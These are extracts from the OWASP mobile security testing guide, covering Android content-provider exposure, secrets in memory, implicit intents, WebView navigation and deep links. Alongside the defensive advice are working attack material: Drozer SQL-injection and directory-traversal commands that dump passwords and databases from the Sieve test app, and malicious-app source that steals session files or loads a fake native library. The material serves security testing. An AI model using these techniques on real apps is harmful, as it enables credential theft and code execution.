# MASTG reference

Mobile Application Security Testing Guide extracts from the OWASP Secure Agent Playbook. Install separately when doing mobile reviews.

Publisher: OWASP Secure Agent Playbook. Edition: MASTG.
Source tree: https://github.com/OWASP/secure-agent-playbook/tree/65d4efd2cd0b081d52101e9708792b944e4ddebb/plugins/code-security-skills/data/mastg (155 sections).

## Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms

## Overview

## Static Analysis

The first step is to look at `AndroidManifest.xml` to detect content providers exposed by the app. You can identify content providers by the `<provider>` element. Complete the following steps:

- Determine whether the value of the export tag (`android:exported`) is `"true"`. Even if it is not, the tag will be set to `"true"` automatically if an `<intent-filter>` has been defined for the tag. If the content is meant to be accessed only by the app itself, set `android:exported` to `"false"`. If not, set the flag to `"true"` and define proper read/write permissions.
- Determine whether the data is being protected by a permission tag (`android:permission`). Permission tags limit exposure to other apps.
- Determine whether the `android:protectionLevel` attribute has the value `signature`. This setting indicates that the data is intended to be accessed only by apps from the same enterprise (i.e., signed with the same key). To make the data accessible to other apps, apply a security policy with the `<permission>` element and set a proper `android:protectionLevel`. If you use `android:permission`, other applications must declare corresponding `<uses-permission>` elements in their manifests to interact with your content provider. You can use the `android:grantUriPermissions` attribute to grant more specific access to other apps; you can limit access with the `<grant-uri-permission>` element.

Inspect the source code to understand how the content provider is meant to be used. Search for the following keywords:

- `android.content.ContentProvider`
- `android.database.Cursor`
- `android.database.sqlite`
- `.query`
- `.update`
- `.delete`

> To avoid SQL injection attacks within the app, use parameterized query methods, such as `query`, `update`, and `delete`. Be sure to properly sanitize all method arguments; for example, the `selection` argument could lead to SQL injection if it is made up of concatenated user input.

 If you expose a content provider, determine whether parameterized [query methods](https://developer.android.com/reference/android/content/ContentProvider.html#query%28android.net.Uri%2C%20java.lang.String[]%2C%20java.lang.String%2C%20java.lang.String[]%2C%20java.lang.String%29 "Query method in ContentProvider Class") (`query`, `update`, and `delete`) are being used to prevent SQL injection. If so, make sure all their arguments are properly sanitized.

We will use the vulnerable password manager app [Sieve](https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk "Sieve - Vulnerable Password Manager") as an example of a vulnerable content provider.

### Inspect the Android Manifest

Identify all defined `<provider>` elements:

```xml
<provider
      android:authorities="com.mwr.example.sieve.DBContentProvider"
      android:exported="true"
      android:multiprocess="true"
      android:name=".DBContentProvider">
    <path-permission
          android:path="/Keys"
          android:readPermission="com.mwr.example.sieve.READ_KEYS"
          android:writePermission="com.mwr.example.sieve.WRITE_KEYS"
     />
</provider>
<provider
      android:authorities="com.mwr.example.sieve.FileBackupProvider"
      android:exported="true"
      android:multiprocess="true"
      android:name=".FileBackupProvider"
/>
```

As shown in the `AndroidManifest.xml` above, the application exports two content providers. Note that one path ("/Keys") is protected by read and write permissions.

### Inspect the source code

Inspect the `query` function in the `DBContentProvider.java` file to determine whether any sensitive information is being leaked:

Example in Java:

```java
public Cursor query(final Uri uri, final String[] array, final String s, final String[] array2, final String s2) {
    final int match = this.sUriMatcher.match(uri);
    final SQLiteQueryBuilder sqLiteQueryBuilder = new SQLiteQueryBuilder();
    if (match >= 100 && match < 200) {
        sqLiteQueryBuilder.setTables("Passwords");
    }
    else if (match >= 200) {
        sqLiteQueryBuilder.setTables("Key");
    }
    return sqLiteQueryBuilder.query(this.pwdb.getReadableDatabase(), array, s, array2, (String)null, (String)null, s2);
}
```

Example in Kotlin:

```kotlin
fun query(uri: Uri?, array: Array<String?>?, s: String?, array2: Array<String?>?, s2: String?): Cursor {
        val match: Int = this.sUriMatcher.match(uri)
        val sqLiteQueryBuilder = SQLiteQueryBuilder()
        if (match >= 100 && match < 200) {
            sqLiteQueryBuilder.tables = "Passwords"
        } else if (match >= 200) {
            sqLiteQueryBuilder.tables = "Key"
        }
        return sqLiteQueryBuilder.query(this.pwdb.getReadableDatabase(), array, s, array2, null as String?, null as String?, s2)
    }
```

Here we see that there are actually two paths, "/Keys" and "/Passwords", and the latter is not being protected in the manifest and is therefore vulnerable.

 When accessing a URI, the query statement returns all passwords and the path `Passwords/`. We will address this in the "Dynamic Analysis" section and show the exact URI that is required.

## Dynamic Analysis

### Testing Content Providers

To dynamically analyze an application's content providers, first enumerate the attack surface: pass the app's package name to the Drozer module `app.provider.info`:

```bash
dz> run app.provider.info -a com.mwr.example.sieve
  Package: com.mwr.example.sieve
  Authority: com.mwr.example.sieve.DBContentProvider
  Read Permission: null
  Write Permission: null
  Content Provider: com.mwr.example.sieve.DBContentProvider
  Multiprocess Allowed: True
  Grant Uri Permissions: False
  Path Permissions:
  Path: /Keys
  Type: PATTERN_LITERAL
  Read Permission: com.mwr.example.sieve.READ_KEYS
  Write Permission: com.mwr.example.sieve.WRITE_KEYS
  Authority: com.mwr.example.sieve.FileBackupProvider
  Read Permission: null
  Write Permission: null
  Content Provider: com.mwr.example.sieve.FileBackupProvider
  Multiprocess Allowed: True
  Grant Uri Permissions: False
```

In this example, two content providers are exported. Both can be accessed without permission, except for the `/Keys` path in the `DBContentProvider`. With this information, you can reconstruct part of the content URIs to access the `DBContentProvider` (the URIs begin with `content://`).

To identify content provider URIs within the application, use Drozer's `scanner.provider.finduris` module. This module guesses paths and determines accessible content URIs in several ways:

```bash
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```

Once you have a list of accessible content providers, try to extract data from each provider with the `app.provider.query` module:

```bash
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w== (Base64 - encoded)
email: incognitoguy50@gmail.com
```

You can also use Drozer to insert, update, and delete records from a vulnerable content provider:

- Insert record

  ```bash
  dz> run app.provider.insert content://com.vulnerable.im/messages
                  --string date 1331763850325
                  --string type 0
                  --integer _id 7
  ```

- Update record

  ```bash
  dz> run app.provider.update content://settings/secure
                  --selection "name=?"
                  --selection-args assisted_gps_enabled
                  --integer value 0
  ```

- Delete record

  ```bash
  dz> run app.provider.delete content://settings/secure
                  --selection "name=?"
                  --selection-args my_setting
  ```

### SQL Injection in Content Providers

The Android platform promotes SQLite databases for storing user data. Because these databases are based on SQL, they may be vulnerable to SQL injection. You can use the Drozer module `app.provider.query` to test for SQL injection by manipulating the projection and selection fields that are passed to the content provider:

```default
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"
unrecognized token: "' FROM Passwords" (code 1): , while compiling: SELECT ' FROM Passwords

dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

If an application is vulnerable to SQL Injection, it will return a verbose error message. SQL Injection on Android may be used to modify or query data from the vulnerable content provider. In the following example, the Drozer module `app.provider.query` is used to list all the database tables:

```default
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
| table | Key              | Key              | 5        | CREATE TABLE ... |
```

SQL Injection may also be used to retrieve data from otherwise protected tables:

```default
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM Key;--"
| Password | pin |
| thisismypassword | 9876 |
```

You can automate these steps with the `scanner.provider.injection` module, which automatically finds vulnerable content providers within an app:

```default
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
```

### File System Based Content Providers

Content providers can provide access to the underlying filesystem. This allows apps to share files (the Android sandbox normally prevents this). You can use the Drozer modules `app.provider.read` and `app.provider.download` to read and download files, respectively, from exported file-based content providers. These content providers are susceptible to directory traversal, which allows otherwise protected files in the target application's sandbox to be read.

```default
dz> run app.provider.download content://com.vulnerable.app.FileProvider/../../../../../../../../data/data/com.vulnerable.app/database.db /home/user/database.db
Written 24488 bytes
```

Use the `scanner.provider.traversal` module to automate the process of finding content providers that are susceptible to directory traversal:

```default
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
  content://com.mwr.example.sieve.FileBackupProvider/
  content://com.mwr.example.sieve.FileBackupProvider
```

Note that `adb` can also be used to query content providers:

```bash
$ adb shell content query --uri content://com.owaspomtg.vulnapp.provider.CredentialProvider/credentials
Row: 0 id=1, username=admin, password=StrongPwd
Row: 1 id=2, username=test, password=test
...
```
## Testing Memory for Sensitive Data

## Overview

Analyzing memory can help developers identify the root causes of several problems, such as application crashes. However, it can also be used to access sensitive data. This section describes how to check for data disclosure via process memory.

First identify sensitive information that is stored in memory. Sensitive assets have likely been loaded into memory at some point. The objective is to verify that this information is exposed as briefly as possible.

To investigate an application's memory, you must first create a memory dump. You can also analyze the memory in real-time, e.g., via a debugger. Regardless of your approach, memory dumping is a very error-prone process in terms of verification because each dump contains the output of executed functions. You may miss executing critical scenarios. In addition, overlooking data during analysis is probable unless you know the data's footprint (either the exact value or the data format). For example, if the app encrypts with a randomly generated symmetric key, you likely won't be able to spot it in memory unless you can recognize the key's value in another context.

Therefore, you are better off starting with static analysis.

## Static Analysis

When performing static analysis to identify sensitive data that is exposed in memory, you should:

- Try to identify application components and map where data is used.
- Make sure that sensitive data is handled by as few components as possible.
- Make sure that object references are properly removed once the object containing the sensitive data is no longer needed.
- Make sure that garbage collection is requested after references have been removed.
- Make sure that sensitive data gets overwritten as soon as it is no longer needed.
    - Don't represent such data with immutable data types (such as `String` and `BigInteger`).
    - Avoid non-primitive data types (such as `StringBuilder`).
    - Overwrite references before removing them, outside the `finalize` method.
    - Pay attention to third-party components (libraries and frameworks).
      Public APIs are good indicators. Determine whether the public API handles the sensitive data as described in this chapter.

**The following section describes pitfalls of data leakage in memory and best practices for avoiding them.**

Don't use immutable structures (e.g., `String` and `BigInteger`) to represent secrets. Nullifying these structures will be ineffective: the garbage collector may collect them, but they may remain on the heap after garbage collection. Nevertheless, you should ask for garbage collection after every critical operation (e.g., encryption, parsing server responses that contain sensitive information). When copies of the information have not been properly cleaned (as explained below), your request will help reduce the length of time for which these copies are available in memory.

To properly clean sensitive information from memory, store it in primitive data types, such as byte-arrays (`byte[]`) and char-arrays (`char[]`). You should avoid storing the information in mutable non-primitive data types.

Make sure to overwrite the content of the critical object once the object is no longer needed. Overwriting the content with zeroes is one simple and very popular method:

Example in Java:

```java
byte[] secret = null;
try{
    //get or generate the secret, do work with it, make sure you make no local copies
} finally {
    if (null != secret) {
        Arrays.fill(secret, (byte) 0);
    }
}
```

Example in Kotlin:

```kotlin
val secret: ByteArray? = null
try {
     //get or generate the secret, do work with it, make sure you make no local copies
} finally {
    if (null != secret) {
        Arrays.fill(secret, 0.toByte())
    }
}
```

This doesn't, however, guarantee that the content will be overwritten at runtime. To optimize the bytecode, the compiler will analyze and decide not to overwrite data because it will not be used afterwards (i.e., it is an unnecessary operation). Even if the code is in the compiled DEX, the optimization may occur during the just-in-time or ahead-of-time compilation in the VM.

There is no silver bullet for this problem because different solutions have different consequences. For example, you may perform additional calculations (e.g., XOR the data into a dummy buffer), but you'll have no way to know the extent of the compiler's optimization analysis. On the other hand, using the overwritten data outside the compiler's scope (e.g., serializing it in a temp file) guarantees that it will be overwritten but obviously impacts performance and maintenance.

Then, using `Arrays.fill` to overwrite the data is a bad idea because the method is an obvious hooking target (see @MASTG-TECH-0043 for more details).

The final issue with the above example is that the content was overwritten with zeroes only. You should try to overwrite critical objects with random data or content from non-critical objects. This will make it really difficult to construct scanners that can identify sensitive data on the basis of its management.

Below is an improved version of the previous example:

Example in Java:

```java
byte[] nonSecret = somePublicString.getBytes("ISO-8859-1");
byte[] secret = null;
try{
    //get or generate the secret, do work with it, make sure you make no local copies
} finally {
    if (null != secret) {
        for (int i = 0; i < secret.length; i++) {
            secret[i] = nonSecret[i % nonSecret.length];
        }

        FileOutputStream out = new FileOutputStream("/dev/null");
        out.write(secret);
        out.flush();
        out.close();
    }
}
```

Example in Kotlin:

```kotlin
val nonSecret: ByteArray = somePublicString.getBytes("ISO-8859-1")
val secret: ByteArray? = null
try {
     //get or generate the secret, do work with it, make sure you make no local copies
} finally {
    if (null != secret) {
        for (i in secret.indices) {
            secret[i] = nonSecret[i % nonSecret.size]
        }

        val out = FileOutputStream("/dev/null")
        out.write(secret)
        out.flush()
        out.close()
        }
}
```

For more information, take a look at [Securely Storing Sensitive Data in RAM](https://github.com/nowsecure/secure-mobile-development/blob/master/en/coding-practices/securely-store-sensitive-data-in-ram.md).

In the "Static Analysis" section, we mentioned the proper way to handle cryptographic keys when you are using `AndroidKeyStore` or `SecretKey`.

For a better implementation of `SecretKey`, look at the `SecureSecretKey` class below. Although the implementation is probably missing some boilerplate code that would make the class compatible with `SecretKey`, it addresses the main security concerns:

- No cross-context handling of sensitive data. Each copy of the key can be cleared from within the scope in which it was created.
- The local copy is cleared according to the recommendations given above.

Example in Java:

```java
  public class SecureSecretKey implements javax.crypto.SecretKey, Destroyable {
      private byte[] key;
      private final String algorithm;

      /** Constructs SecureSecretKey instance out of a copy of the provided key bytes.
        * The caller is responsible of clearing the key array provided as input.
        * The internal copy of the key can be cleared by calling the destroy() method.
        */
      public SecureSecretKey(final byte[] key, final String algorithm) {
          this.key = key.clone();
          this.algorithm = algorithm;
      }

      public String getAlgorithm() {
          return this.algorithm;
      }

      public String getFormat() {
          return "RAW";
      }

      /** Returns a copy of the key.
        * Make sure to clear the returned byte array when no longer needed.
        */
      public byte[] getEncoded() {
          if(null == key){
              throw new NullPointerException();
          }

          return key.clone();
      }

      /** Overwrites the key with dummy data to ensure this copy is no longer present in memory.*/
      public void destroy() {
          if (isDestroyed()) {
              return;
          }

          byte[] nonSecret = new String("RuntimeException").getBytes("ISO-8859-1");
          for (int i = 0; i < key.length; i++) {
            key[i] = nonSecret[i % nonSecret.length];
          }

          FileOutputStream out = new FileOutputStream("/dev/null");
          out.write(key);
          out.flush();
          out.close();

          this.key = null;
          System.gc();
      }

      public boolean isDestroyed() {
          return key == null;
      }
  }
```

Example in Kotlin:

```kotlin
class SecureSecretKey(key: ByteArray, algorithm: String) : SecretKey, Destroyable {
    private var key: ByteArray?
    private val algorithm: String
    override fun getAlgorithm(): String {
        return algorithm
    }

    override fun getFormat(): String {
        return "RAW"
    }

    /** Returns a copy of the key.
     * Make sure to clear the returned byte array when no longer needed.
     */
    override fun getEncoded(): ByteArray {
        if (null == key) {
            throw NullPointerException()
        }
        return key!!.clone()
    }

    /** Overwrites the key with dummy data to ensure this copy is no longer present in memory. */
    override fun destroy() {
        if (isDestroyed) {
            return
        }
        val nonSecret: ByteArray = String("RuntimeException").toByteArray(charset("ISO-8859-1"))
        for (i in key!!.indices) {
            key!![i] = nonSecret[i % nonSecret.size]
        }
        val out = FileOutputStream("/dev/null")
        out.write(key)
        out.flush()
        out.close()
        key = null
        System.gc()
    }

    override fun isDestroyed(): Boolean {
        return key == null
    }

    /** Constructs SecureSecretKey instance out of a copy of the provided key bytes.
     * The caller is responsible of clearing the key array provided as input.
     * The internal copy of the key can be cleared by calling the destroy() method.
     */
    init {
        this.key = key.clone()
        this.algorithm = algorithm
    }
}
```

Secure user-provided data is the final secure information type usually found in memory. This is often managed by implementing a custom input method, for which you should follow the recommendations given here. However, Android allows information to be partially erased from `EditText` buffers via a custom `Editable.Factory`.

```java
EditText editText = ...; //  point your variable to your EditText instance
EditText.setEditableFactory(new Editable.Factory() {
  public Editable newEditable(CharSequence source) {
  ... // return a new instance of a secure implementation of Editable.
  }
});
```

Refer to the `SecureSecretKey` example above for an example `Editable` implementation. Note that you will be able to securely handle all copies made by `editText.getText` if you provide your factory. You can also try to overwrite the internal `EditText` buffer by calling `editText.setText`, but there is no guarantee that the buffer will not have been copied already. If you choose to rely on the default input method and `EditText`, you will have no control over the keyboard or other components that are used. Therefore, you should use this approach for semi-confidential information only.

In all cases, make sure that sensitive data in memory is cleared when a user signs out of the application. Finally, make sure that highly sensitive information is cleared out the moment an Activity or Fragment's `onPause` event is triggered.

!!! note
    This might mean that a user has to re-authenticate every time the application resumes.

## Dynamic Analysis

Static analysis will help you identify potential problems, but it can't provide statistics about how long data has been exposed in memory, nor can it help you identify problems in closed-source dependencies. This is where dynamic analysis comes into play.

There are various ways to analyze the memory of a process, e.g. live analysis via a debugger/dynamic instrumentation and analyzing one or more memory dumps.

### Retrieving and Analyzing a Memory Dump

Whether you are using a rooted or a non-rooted device, you can dump the app's process memory with @MASTG-TOOL-0038 and @MASTG-TOOL-0106. You can find a detailed explanation of this process in @MASTG-TECH-0044, in the chapter "Tampering and Reverse Engineering on Android".

After the memory has been dumped (e.g. to a file called "memory"), depending on the nature of the data you're looking for, you'll need a set of different tools to process and analyze that memory dump. For instance, if you're focusing on strings, it might be sufficient for you to execute the command `strings` or `rabin2 -zz` from @MASTG-TOOL-0129 to extract those strings.

```bash
# using strings
$ strings memory > strings.txt

# using rabin2
$ rabin2 -ZZ memory > strings.txt
```

Open `strings.txt` in your favorite editor and dig through it to identify sensitive information.

However if you'd like to inspect other kind of data, you'd rather want to use radare2 and its search capabilities. See radare2's help on the search command (`/?`) for more information and a list of options. The following shows only a subset of them:

```bash
$ r2 <name_of_your_dump_file>

[0x00000000]> /?
Usage: /[!bf] [arg]  Search stuff (see 'e??search' for options)
|Use io.va for searching in non virtual addressing spaces
| / foo\x00                    search for string 'foo\0'
| /c[ar]                       search for crypto materials
| /e /E.F/i                    match regular expression
| /i foo                       search for string 'foo' ignoring case
| /m[?][ebm] magicfile         search for magic, filesystems or binary headers
| /v[1248] value               look for an `cfg.bigendian` 32bit value
| /w foo                       search for wide string 'f\0o\0o\0'
| /x ff0033                    search for hex string
| /z min max                   search for strings of given size
...
```

### Runtime Memory Analysis

Instead of dumping the memory to your host computer, you can alternatively use @MASTG-TOOL-0036. With it, you can analyze and inspect the app's memory while it's running.
For example, you may run the previous search commands from r2frida and search the memory for a string, hexadecimal values, etc. When doing so, remember to prepend the search command (and any other r2frida specific commands) with a backslash `:` after starting the session with `r2 frida://usb//<name_of_your_app>`.

For more information, options and approaches, please refer to @MASTG-TECH-0044 for more information.

### Explicitly Dumping and Analyzing the Java Heap

For rudimentary analysis, you can use Android Studio's built-in tools. They are on the _Android Monitor_ tab. To dump memory, select the device and app you want to analyze and click _Dump Java Heap_. This will create a _.hprof_ file in the _captures_ directory, which is on the app's project path.

<img src="Images/Chapters/0x05d/Dump_Java_Heap.png" width="100%" />

To navigate through class instances that were saved in the memory dump, select the Package Tree View in the tab showing the _.hprof_ file.

<img src="Images/Chapters/0x05d/Package_Tree_View.png" width="100%" />

For more advanced analysis of the memory dump, use the [Eclipse Memory Analyzer Tool (MAT)](https://eclipse.org/mat/downloads.php "Eclipse Memory Analyzer Tool"). It is available as an Eclipse plugin and as a standalone application.

To analyze the dump in MAT, use the _hprof-conv_ platform tool, which comes with the Android SDK.

```bash
./hprof-conv memory.hprof memory-mat.hprof
```

MAT provides several tools for analyzing the memory dump. For example, the _Histogram_ provides an estimate of the number of objects that have been captured from a given type, and the _Thread Overview_ shows processes' threads and stack frames. The _Dominator Tree_ provides information about keep-alive dependencies between objects. You can use regular expressions to filter the results these tools provide.

_Object Query Language_ studio is a MAT feature that allows you to query objects from the memory dump with an SQL-like language. The tool allows you to transform simple objects by invoking Java methods on them, and it provides an API for building sophisticated tools on top of the MAT.

```sql
SELECT * FROM java.lang.String
```

In the example above, all `String` objects present in the memory dump will be selected. The results will include the object's class, memory address, value, and retain count. To filter this information and see only the value of each string, use the following code:

```sql
SELECT toString(object) FROM java.lang.String object
```

Or

```sql
SELECT object.toString() FROM java.lang.String object
```

SQL supports primitive data types as well, so you can do something like the following to access the content of all `char` arrays:

```sql
SELECT toString(arr) FROM char[] arr
```

Don't be surprised if you get results that are similar to the previous results; after all, `String` and other Java data types are just wrappers around primitive data types. Now let's filter the results. The following sample code will select all byte arrays that contain the ASN.1 OID of an RSA key. This doesn't imply that a given byte array actually contains an RSA (the same byte sequence may be part of something else), but this is probable.

```sql
SELECT * FROM byte[] b WHERE toString(b).matches(".*1\.2\.840\.113549\.1\.1\.1.*")
```

Finally, you don't have to select whole objects. Consider an SQL analogy: classes are tables, objects are rows, and fields are columns. If you want to find all objects that have a "password" field, you can do something like the following:

```sql
SELECT password FROM ".*" WHERE (null != password)
```

During your analysis, search for:

- Indicative field names: "password", "pass", "pin", "secret", "private", etc.
- Indicative patterns (e.g., RSA footprints) in strings, char arrays, byte arrays, etc.
- Known secrets (e.g., a credit card number that you've entered or an authentication token provided by the backend)
- etc.

Repeating tests and memory dumps will help you obtain statistics about the length of data exposure. Furthermore, observing the way a particular memory segment (e.g., a byte array) changes may lead you to some otherwise unrecognizable sensitive data (more on this in the "Remediation" section below).
## Testing Implicit Intents

## Overview

When testing for [implicit intents](../../../Document/0x05h-Testing-Platform-Interaction.md#implicit-intents) you need to check if they are vulnerable to injection attacks or potentially leaking sensitive data.

## Static Analysis

Inspect the Android Manifest and look for any `<intent>` signatures defined inside [<queries> blocks](https://developer.android.com/guide/topics/manifest/queries-element "Android queries") (which specify the set of other apps an app intends to interact with), check if it contains any system actions (e.g. `android.intent.action.GET_CONTENT`, `android.intent.action.PICK`, `android.media.action.IMAGE_CAPTURE`, etc.) and browse the source code for their occurrence.

For example, the following `Intent` doesn't specify any concrete component, meaning that it's an implicit intent. It sets the action `android.intent.action.GET_CONTENT` to ask the user for input data and then the app starts the intent by `startActivityForResult` and specifying an image chooser.

```java
Intent intent = new Intent();
intent.setAction("android.intent.action.GET_CONTENT");
startActivityForResult(Intent.createChooser(intent, ""), REQUEST_IMAGE);
```

The app uses `startActivityForResult` instead of `startActivity`, indicating that it expects a result (in this case an image), so you should check how the return value of the intent is handled by looking for the `onActivityResult` callback. If the return value of the intent isn't properly validated, an attacker may be able to read arbitrary files or execute arbitrary code from the app's internal `/data/data/<appname>' storage. A full description of this type of attack can be found in the [following blog post](https://blog.oversecured.com/Interception-of-Android-implicit-intents " Current attacks on implicit intents").

### Case 1: Arbitrary File Read

In this example we're going to see how an attacker can read arbitrary files from within the app's internal storage `/data/data/<appname>` due to the improper validation of the return value of the intent.

The `performAction` method in the following example reads the implicit intents return value, which can be an attacker provided URI and hands it to `getFileItemFromUri`. This method copies the file to a temp folder, which is usual if this file is displayed internally. But if the app stores the URI provided file in an external temp directory e.g by calling `getExternalCacheDir` or `getExternalFilesDir` an attacker can read this file after setting the permission `android.permission.READ_EXTERNAL_STORAGE`.

```java
private void performAction(Action action){
  ...
  Uri data = intent.getData();
  if (!(data == null || (fileItemFromUri = getFileItemFromUri(data)) == null)) {
      ...
  }
}

private FileItem getFileItemFromUri(Context, context, Uri uri){
  String fileName = UriExtensions.getFileName(uri, context);
  File file = new File(getExternalCacheDir(), "tmp");
  file.createNewFile();
  copy(context.openInputStream(uri), new FileOutputStream(file));
  ...
}
```

The following is the source of a malicious app that exploits the above vulnerable code.

AndroidManifest.xml

```xml
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<application>
  <activity android:name=".EvilContentActivity">
      <intent-filter android:priority="999">
          <action android:name="android.intent.action.GET_CONTENT" />
          <data android:mimeType="*/*" />
      </intent-filter>
  </activity>
</application>
```

EvilContentActivity.java

```java
public class EvilContentActivity extends Activity{
  @Override
  protected void OnCreate(@Nullable Bundle savedInstanceState){
    super.OnCreate(savedInstanceState);
    setResult(-1, new Intent().setData(Uri.parse("file:///data/data/<victim_app>/shared_preferences/session.xml")));
    finish();
  }
}
```

If the user selects the malicious app to handle the intent, the attacker can now steal the `session.xml` file from the app's internal storage. In the previous example, the victim must explicitly select the attacker's malicious app in a dialog. However, developers may choose to suppress this dialog and automatically determine a recipient for the intent. This would allow the attack to occur without any additional user interaction.

The following code sample implements this automatic selection of the recipient. By specifying a priority in the malicious app's intent filter, the attacker can influence the selection sequence.

```java
Intent intent = new Intent("android.intent.action.GET_CONTENT");
for(ResolveInfo info : getPackageManager().queryIntentActivities(intent, 0)) {
    intent.setClassName(info.activityInfo.packageName, info.activityInfo.name);
    startActivityForResult(intent);
    return;
}
```

### Case 2: Arbitrary Code Execution

An improperly handled return value of an implicit intent can lead to arbitrary code execution if the victim app allows `content://` and `file://` URLs.

An attacker can implement a [`ContentProvider`](https://developer.android.com/reference/android/content/ContentProvider "Android ContentProvider") that contains `public Cursor query(...)` to set an arbitrary file (in this case _lib.so_), and if the victim loads this file from the content provider by executing `copy` the attacker's `ParcelFileDescriptor openFile(...)` method will be executed and return a malicious _fakelib.so_.

AndroidManifest.xml

```xml
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<application>
  <activity android:name=".EvilContentActivity">
      <intent-filter android:priority="999">
          <action android:name="android.intent.action.GET_CONTENT" />
          <data android:mimeType="*/*" />
      </intent-filter>
  </activity>
  <provider android:name=".EvilContentProvider" android:authorities="com.attacker.evil" android:enabled="true" android:exported="true"></provider>
</application>
```

EvilContentProvider.java

```java
public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
    MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name"});
    matrixCursor.addRow(new Object[]{"../lib-main/lib.so"});
    return matrixCursor;
}
public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    return ParcelFileDescriptor.open(new File("/data/data/com.attacker/fakelib.so"), ParcelFileDescriptor.MODE_READ_ONLY);
}
```

EvilContentActivity.java

```java
public class EvilContentActivity extends Activity{
  @Override
  protected void OnCreate(@Nullable Bundle savedInstanceState){
    super.OnCreate(savedInstanceState);
    setResult(-1, new Intent().setData(Uri.parse("content:///data/data/com.attacker/fakelib.so")));
    finish();
  }
}
```

## Dynamic Analysis

A convenient way to dynamically test for implicit intents, especially to identify potentially leaked sensitive data, is to use Frida or frida-trace and hook the `startActivityForResult` and `onActivityResult` methods and inspect the provided intents and the data they contain.
## Testing for URL Loading in WebViews

## Overview

In order to test for [URL loading in WebViews](../../../Document/0x05h-Testing-Platform-Interaction.md#url-loading-in-webviews "URL Loading in WebViews") you need to carefully analyze [handling page navigation](https://developer.android.com/guide/webapps/webview#HandlingNavigation "Handling page navigation"), especially when users might be able to navigate away from a trusted environment. The default and safest behavior on Android is to let the default web browser open any link that the user might click inside the WebView. However, this default logic can be modified by configuring a `WebViewClient` which allows navigation requests to be handled by the app itself.

## Static Analysis

### Check for Page Navigation Handling Override

To test if the app is overriding the default page navigation logic by configuring a `WebViewClient` you should search for and inspect the following interception callback functions:

- `shouldOverrideUrlLoading` allows your application to either abort loading WebViews with suspicious content by returning `true` or allow the WebView to load the URL by returning `false`. Considerations:
    - This method is not called for POST requests.
    - This method is not called for XmlHttpRequests, iFrames, "src" attributes included in HTML or `<script>` tags. Instead, `shouldInterceptRequest` should take care of this.
- `shouldInterceptRequest` allows the application to return the data from resource requests. If the return value is null, the WebView will continue to load the resource as usual. Otherwise, the data returned by the `shouldInterceptRequest` method is used. Considerations:
    - This callback is invoked for a variety of URL schemes (e.g., `http(s):`, `data:`, `file:`, etc.), not only those schemes which send requests over the network.
    - This is not called for `javascript:` or `blob:` URLs, or for assets accessed via `file:///android_asset/` or `file:///android_res/` URLs.
  In the case of redirects, this is only called for the initial resource URL, not any subsequent redirect URLs.
    - When Safe Browsing is enabled, these URLs still undergo Safe Browsing checks but the developer can allow the URL with `setSafeBrowsingWhitelist` or even ignore the warning via the `onSafeBrowsingHit` callback.

As you can see there are a lot of points to consider when testing the security of WebViews that have a WebViewClient configured, so be sure to carefully read and understand all of them by checking the [`WebViewClient` Documentation](https://developer.android.com/reference/android/webkit/WebViewClient "WebViewClient").

### Check for EnableSafeBrowsing Disabled

While the default value of `EnableSafeBrowsing` is `true`, some applications might opt to disable it. To verify that SafeBrowsing is enabled, inspect the AndroidManifest.xml file and make sure that the configuration below is not present:

```xml
<manifest>
    <application>
        <meta-data android:name="android.webkit.WebView.EnableSafeBrowsing"
                   android:value="false" />
        ...
    </application>
</manifest>
```

## Dynamic Analysis

A convenient way to dynamically test deep linking is to use Frida or frida-trace and hook the `shouldOverrideUrlLoading`, `shouldInterceptRequest` methods while using the app and clicking on links within the WebView. Be sure to also hook other related [`Uri`](https://developer.android.com/reference/android/net/Uri "Uri class") methods such as `getHost`, `getScheme` or `getPath` which are typically used to inspect the requests and match known patterns or deny lists.
## Testing Deep Links

## Overview

Any existing [deep links](../../../Document/0x05h-Testing-Platform-Interaction.md#deep-links "Deep Links") (including App Links) can potentially increase the app attack surface. This [includes many risks](https://people.cs.vt.edu/gangwang/deep17.pdf) such as link hijacking, sensitive functionality exposure, etc.

- Before Android 12 (API level 31), if the app has any [non-verifiable links](https://developer.android.com/training/app-links/verify-android-applinks#fix-errors), it can cause the system to not verify all Android App Links for that app.
- Starting on Android 12 (API level 31), apps benefit from a [reduced attack surface](https://developer.android.com/training/app-links/deep-linking). A generic web intent resolves to the user's default browser app unless the target app is approved for the specific domain contained in that web intent.

